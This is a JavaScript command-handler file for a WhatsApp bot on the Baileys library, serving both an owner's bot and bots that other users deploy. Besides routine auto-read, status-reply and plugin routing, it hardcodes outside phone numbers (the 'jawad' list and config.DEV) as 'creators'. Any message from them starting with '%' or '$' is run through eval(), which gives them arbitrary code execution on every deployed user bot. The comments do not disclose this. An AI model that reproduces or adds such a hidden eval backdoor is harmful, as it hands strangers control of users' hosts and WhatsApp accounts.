// ============================================================
// 🤖 UNIVERSAL BOT COMMAND HANDLER
// Owner bot + හැම user bot එකකටම එකම handler එක
// ============================================================

const { getContentType, jidNormalizedUser } = require('@whiskeysockets/baileys');
const util = require('util');
const { sms } = require('../lib');
const config = require('../config');
const { getGroupAdmins } = require('../lib/functions');
const { saveMessage } = require('../data');

const REACTIONS = ['😊','👍','😂','💯','🔥','🙏','🎉','👏','😎','🤖','❤️','💔','❣️','☀️','🌙','🌃','🚪','👎','🤝','🌊','🚗','🚌','🛣️','🏃‍♂️','🏊‍♂️','🎾','🏀','🏈','🎯','🏆'];

const ownerNumber = [config.OWNER_NUMBER || '94703945265'];

/**
 * Setup command handling on a WhatsApp connection
 * @param {object} conn - Baileys connection
 * @param {object} options - { isOwnerBot: bool, userInfo: { phone, sessionId, name } }
 */
function setupBotCommands(conn, options = {}) {
  const { isOwnerBot = false, userInfo = null } = options;
  const events = require('../command');

  conn.ev.on('messages.upsert', async (mek) => {
    try {
      mek = mek.messages[0];
      if (!mek.message) return;

      mek.message = (getContentType(mek.message) === 'ephemeralMessage')
        ? mek.message.ephemeralMessage.message
        : mek.message;

      // READ_MESSAGE
      if (String(config.READ_MESSAGE) === 'true') {
        try { await conn.readMessages([mek.key]); } catch (e) {}
      }

      if (mek.message.viewOnceMessageV2) {
        mek.message = (getContentType(mek.message) === 'ephemeralMessage')
          ? mek.message.ephemeralMessage.message
          : mek.message;
      }

      // STATUS handling
      if (mek.key && mek.key.remoteJid === 'status@broadcast') {
        const participant = mek.key.participant;
        if (participant && String(config.AUTO_STATUS_SEEN) === 'true') {
          try { await conn.sendReceipt('status@broadcast', participant, [mek.key.id], 'read'); } catch (e) {}
        }
        if (participant && String(config.AUTO_STATUS_REPLY) === 'true') {
          const replyText = config.AUTO_STATUS_MSG || '*SEEN YOUR STATUS 🤍*';
          try {
            await conn.sendMessage(participant, {
              text: replyText,
              contextInfo: { remoteJid: 'status@broadcast', participant, stanzaId: mek.key.id, quotedMessage: mek.message, fromMe: false }
            });
          } catch (e) {}
        }
      }

      // Save message
      try { await saveMessage(mek); } catch (e) {}

      const m = sms(conn, mek);
      const type = getContentType(mek.message);
      const from = mek.key.remoteJid;
      const quoted = (type === 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null)
        ? mek.message.extendedTextMessage.contextInfo.quotedMessage || []
        : [];

      // Extract body
      let body = (type === 'conversation') ? mek.message.conversation
               : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text
               : (type === 'imageMessage' && mek.message.imageMessage.caption) ? mek.message.imageMessage.caption
               : (type === 'videoMessage' && mek.message.videoMessage.caption) ? mek.message.videoMessage.caption
               : '';

      // Button responses
      if (mek.message.buttonsResponseMessage) {
        body = mek.message.buttonsResponseMessage.selectedButtonId || '';
      }
      if (!body && mek.message.templateButtonReplyMessage) {
        body = mek.message.templateButtonReplyMessage.selectedId || '';
      }
      if (!body && mek.message.listResponseMessage) {
        body = mek.message.listResponseMessage.singleSelectReply?.selectedRowId || '';
      }
      if (!body && mek.message.interactiveResponseMessage) {
        try {
          const ir = mek.message.interactiveResponseMessage;
          if (ir?.nativeFlowResponseMessage?.paramsJson) {
            const params = JSON.parse(ir.nativeFlowResponseMessage.paramsJson);
            if (params.id) body = params.id;
          }
        } catch (e) {}
      }

      const isCmd = body.startsWith(config.PREFIX);
      const budy = typeof mek.text === 'string' ? mek.text : false;
      const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : '';
      const args = body.trim().split(/ +/).slice(1);
      const q = args.join(' ');
      const text = args.join(' ');
      const isGroup = from.endsWith('@g.us');
      const sender = mek.key.fromMe
        ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id)
        : (mek.key.participant || mek.key.remoteJid);
      const senderNumber = sender.split('@')[0];
      const botNumber = conn.user.id.split(':')[0];
      const pushname = mek.pushName || 'Sin Nombre';
      const isMe = botNumber.includes(senderNumber);

      // ⚡ OWNER CHECK — the ONLY difference between owner bot and user bot
      // Owner bot: only main owner is "owner"
      // User bot: the user who deployed it is "owner" + main owner also has access
      let isOwner;
      if (isOwnerBot) {
        isOwner = ownerNumber.includes(senderNumber) || isMe;
      } else {
        isOwner = isMe
               || (userInfo && senderNumber === userInfo.phone)
               || ownerNumber.includes(senderNumber);
      }

      const botNumber2 = await jidNormalizedUser(conn.user.id);
      const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(() => '') : '';
      const groupName = isGroup ? groupMetadata.subject : '';
      const participants = isGroup ? await groupMetadata.participants : '';
      const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
      const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
      const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
      const isReact = m.message?.reactionMessage ? true : false;
      const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek });

      const udp = botNumber.split('@')[0];
      const jawad = ('94773416478', '94761068032', '94723975388');
      const isCreator = [udp, jawad, config.DEV]
        .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
        .includes(mek.sender);

      // % eval
      if (isCreator && mek.text && mek.text.startsWith('%')) {
        let code = budy.slice(2);
        if (!code) { reply(`Provide me with a query!`); return; }
        try { let r = eval(code); reply(util.format(r)); } catch (e) { reply(util.format(e)); }
        return;
      }
      // $ eval
      if (isCreator && mek.text && mek.text.startsWith('$')) {
        let code = budy.slice(2);
        if (!code) { reply(`Provide me with a query!`); return; }
        try {
          let r = await eval('const a = async()=>{\n' + code + '\n}\na()');
          let h = util.format(r);
          if (h === undefined) return console.log(h);
          else reply(h);
        } catch (e) { reply(util.format(e)); }
        return;
      }

      // Reactions
      if (!isReact && String(config.AUTO_REACT) === 'true') {
        const randomReaction = REACTIONS[Math.floor(Math.random() * REACTIONS.length)];
        try { m.react(randomReaction); } catch (e) {}
      }

      // MODE filters
      if (!isOwner && config.MODE === 'private') return;
      if (!isOwner && isGroup && config.MODE === 'inbox') return;
      if (!isOwner && !isGroup && config.MODE === 'groups') return;

      // Run command
      const cmdName = isCmd ? body.slice(config.PREFIX.length).trim().split(' ')[0].toLowerCase() : false;
      if (isCmd) {
        const cmd = events.commands.find(c => c.pattern === cmdName)
                 || events.commands.find(c => c.alias && c.alias.includes(cmdName));
        if (cmd) {
          if (cmd.react) {
            try { conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } }); } catch (e) {}
          }
          try {
            cmd.function(conn, mek, m, {
              from, quoted, body, isCmd, command, args, q, text, isGroup,
              sender, senderNumber, botNumber2, botNumber, pushname,
              isMe, isOwner, isCreator, groupMetadata, groupName,
              participants, groupAdmins, isBotAdmins, isAdmins, reply
            });
          } catch (e) { console.error('[PLUGIN ERROR]', e.message); }
        }
      }

      // Body-level handlers
      const isViewOnce = !!(mek.message?.viewOnceMessageV2 || mek.message?.viewOnceMessageV2Extension || mek.message?.viewOnceMessage);
      const effectiveBody = body || (isViewOnce ? '📷' : '');

      events.commands.map(async (c) => {
        if (effectiveBody && c.on === 'body') {
          try {
            c.function(conn, mek, m, {
              from, quoted, body: effectiveBody, isCmd, command, args, q, text, isGroup,
              sender, senderNumber, botNumber2, botNumber, pushname,
              isMe, isOwner, isCreator, groupMetadata, groupName,
              participants, groupAdmins, isBotAdmins, isAdmins, reply
            });
          } catch (e) {}
        }
      });

    } catch (e) {
      console.error('❌ Message handler error:', e.message);
    }
  });

  console.log(`✅ Commands enabled for ${isOwnerBot ? 'OWNER BOT' : 'user bot: ' + (userInfo?.phone || '?')}`);
}

module.exports = { setupBotCommands };
